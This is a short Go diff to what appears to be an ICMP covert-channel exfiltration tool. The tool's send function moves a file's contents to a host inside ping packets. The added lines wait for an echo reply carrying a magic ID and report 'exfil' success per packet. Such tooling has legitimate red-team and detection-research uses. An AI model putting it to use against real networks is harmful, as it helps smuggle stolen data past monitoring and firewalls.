@@ -63,6 +63,23 @@ func send(file *string, debug *bool, host *string) {
 			return
 		}
 		socket.WriteTo(b, socket.LocalAddr())
+		// wait for a reply
+		bytesRead, _, sockErr = socket.ReadFrom(b)
+		if nil != sockErr {
+			fmt.Println("reply error")
+			return
+		}
+		success, msg := filterICMP(b, ipv4.ICMPType(IPV4ICMPREPLY))
+		if !success {
+			fmt.Println("not correct ICMP packet")
+			return
+		}
+		echoSuccess, replyPak := filterEcho(msg)
+		if !echoSuccess || replyPak.ID != MAGIC {
+			fmt.Println("did not get exfil reply")
+			return
+		}
+		fmt.Printf("Sent and received packet %d\n", echoPak.Seq)
 		echoPak.Seq += 1
 		exfilPak.first = false
 	}
